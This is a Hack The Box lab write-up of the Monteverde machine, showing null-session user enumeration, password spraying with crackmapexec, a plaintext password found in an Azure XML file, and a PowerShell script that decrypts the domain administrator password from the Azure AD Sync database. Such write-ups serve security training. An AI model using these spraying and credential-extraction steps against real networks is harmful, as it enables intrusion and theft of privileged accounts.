---
layout: single
title: Monteverde - Hack The Box
excerpt: "Monteverde was an Active Directory box on the easier side that requires enumerating user accounts then password spraying to get an initial shell. Then we find more credentials looking around the box and eventually find the MSOL account password which we use to get administrator access."
date: 2020-06-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-monteverde/monteverde_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - ad
  - password spray
  - azure ad
  - crackmapexec
  - plaintext creds
  - winrm
---

![](/assets/images/htb-writeup-monteverde/monteverde_logo.png)

Monteverde was an Active Directory box on the easier side that requires enumerating user accounts then password spraying to get an initial shell. Then we find more credentials looking around the box and eventually find the MSOL account password which we use to get administrator access.

## Summary

- Get the list of users and groups from a null session on the domain controller
- Use crackmapexec to spray credentials, find an account that uses the username as the password
- Find an Azure XML file with a plaintext password from a PSADPasswordCredential object
- Log in with the credentials, find and decrypt the password for the MSOL account
- Log in as administrator with the MSOL account password

## Portscan

```
root@kali:~/htb/monteverde# nmap -sC -sV -p- 10.10.10.172
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 08:09 EST
Nmap scan report for monteverde.htb (10.10.10.172)
Host is up (0.022s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-12 13:22:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49775/tcp open  msrpc         Microsoft Windows RPC
```

## Listing users and groups in AD

With RPC client we can pull the list of users and groups (null sessions are allowed):

```
root@kali:~# rpcclient -U "" -N 10.10.10.172
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
```

Observations:
- There's an Azure Admins group which is not standard by default in Windows unless the domain has been connected to Azure AD with ADSync

We can also retrieve the same information with LDAP using a tool like ldapsearch or windapsearch:

```
root@kali:~/tools/windapsearch# ./windapsearch.py --dc-ip 10.10.10.172 -U 
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.172
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 10 users: 

cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

[...]
```

```
root@kali:~/tools/windapsearch# ./windapsearch.py --dc-ip 10.10.10.172 -G 
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.172
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD groups
[+]	Found 48 groups: 

distinguishedName: CN=Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
cn: Users

distinguishedName: CN=Guests,CN=Builtin,DC=MEGABANK,DC=LOCAL
cn: Guests

[...]
```

## Password spraying

To password spray, I usually start with a small wordlist then expand if I don't find anything. Here, we'll create a custom wordlist using the smaller rockyou list and the list of users in case some users are using their username as the password:

```
root@kali:~/htb/monteverde# cat << EOF > users.txt
> Guest
> AAD_987d7f2f57d2
> mhope
> SABatchJobs
> svc-ata
> svc-bexec
> svc-netapp
> dgalanos
> roleary
> smorgan
> EOF
root@kali:~/htb/monteverde# cat ~/tools/SecLists/Passwords/Leaked-Databases/rockyou-10.txt >> users.txt
```

Then we'll use crackmapexec to spray the credentials. Another tool like kerbrute could also be used for this since port 88 is open.
```
root@kali:~/htb/monteverde# cme smb 10.10.10.172 -u /root/htb/monteverde/users.txt -p /root/htb/monteverde/passwords.txt | grep -v FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
```

Here we go, we got a valid account: `SABatchJobs / SABatchJobs`

Checking shares...

```
root@kali:~/htb/monteverde# cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ
```

While checking the home directories on the server, we find an Azure XML file with another password: `4n0therD4y@n0th3r$`
```
root@kali:~/htb/monteverde# smbclient -U SABatchJobs //10.10.10.172/Users$
Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \> cd mhope
smb: \mhope\> dir
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (12.9 KiloBytes/sec) (average 12.9 KiloBytes/sec)
smb: \mhope\> exit
root@kali:~/htb/monteverde# cat azure.xml
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

We can now connect via WinRM to the server as user `mhope`:

```
root@kali:~/htb/monteverde# evil-winrm -u mhope -p 4n0therD4y@n0th3r$ -i 10.10.10.172

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> type ..\desktop\user.txt
4961976bd7[...]
```

## Privesc using the Azure AD Sync database

Ref: [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)

Ref2: [https://aireforge.com/Tools/DotNetSqlServerConnectionStringGenerator](https://aireforge.com/Tools/DotNetSqlServerConnectionStringGenerator)

`mhope` is part of the `Azure Admins` group:

```
*Evil-WinRM* PS C:\Users\mhope\Documents> net users mhope
[...]

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

This group normally has the AAD_xxxxxxxxxx service account created to manage the AD Sync service. Because our user is also a member of that group he also has access to the local SQL server database which contains the encrypted password for the MSOL account.

The ADsync database exist:

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> sqlcmd -S localhost -Q "select name from sys.databases"
name
---------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
ADSync

(5 rows affected)
```

The file line of the string from the blogpost had to be modified with the correct connection string: `Data Source=localhost;Database=ADSync;Integrated Security=sspi`

```
*Evil-WinRM* PS C:\Users\mhope\Documents> $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=localhost;Database=ADSync;Integrated Security=sspi"
*Evil-WinRM* PS C:\Users\mhope\Documents> $client.Open()
*Evil-WinRM* PS C:\Users\mhope\Documents> $cmd = $client.CreateCommand()
*Evil-WinRM* PS C:\Users\mhope\Documents> $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader = $cmd.ExecuteReader()
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader.Read() | Out-Null
*Evil-WinRM* PS C:\Users\mhope\Documents> $key_id = $reader.GetInt32(0)
*Evil-WinRM* PS C:\Users\mhope\Documents> $instance_id = $reader.GetGuid(1)
*Evil-WinRM* PS C:\Users\mhope\Documents> $entropy = $reader.GetGuid(2)
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader.Close()
*Evil-WinRM* PS C:\Users\mhope\Documents> 
*Evil-WinRM* PS C:\Users\mhope\Documents> $cmd = $client.CreateCommand()
*Evil-WinRM* PS C:\Users\mhope\Documents> $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader = $cmd.ExecuteReader()
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader.Read() | Out-Null
*Evil-WinRM* PS C:\Users\mhope\Documents> $config = $reader.GetString(0)
*Evil-WinRM* PS C:\Users\mhope\Documents> $crypted = $reader.GetString(1)
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader.Close()
*Evil-WinRM* PS C:\Users\mhope\Documents> 
*Evil-WinRM* PS C:\Users\mhope\Documents> add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll’
*Evil-WinRM* PS C:\Users\mhope\Documents> $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
*Evil-WinRM* PS C:\Users\mhope\Documents> $km.LoadKeySet($entropy, $instance_id, $key_id)
*Evil-WinRM* PS C:\Users\mhope\Documents> $key = $null
*Evil-WinRM* PS C:\Users\mhope\Documents> $km.GetActiveCredentialKey([ref]$key)
*Evil-WinRM* PS C:\Users\mhope\Documents> $key2 = $null
*Evil-WinRM* PS C:\Users\mhope\Documents> $km.GetKey(1, [ref]$key2)
*Evil-WinRM* PS C:\Users\mhope\Documents> $decrypted = $null
*Evil-WinRM* PS C:\Users\mhope\Documents> $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
*Evil-WinRM* PS C:\Users\mhope\Documents> $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:\Users\mhope\Documents> $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:\Users\mhope\Documents> $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Domain: " + $domain.Domain)
Domain: MEGABANK.LOCAL
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Username: " + $username.Username)
Username: administrator
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Password: " + $password.Password)
Password: d0m@in4dminyeah!
```

We got the administrator password now: `d0m@in4dminyeah!`

```
root@kali:~/htb/monteverde# evil-winrm -u administrator -p 'd0m@in4dminyeah!' -i 10.10.10.172

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\desktop\root.txt
12909612d2[...]
```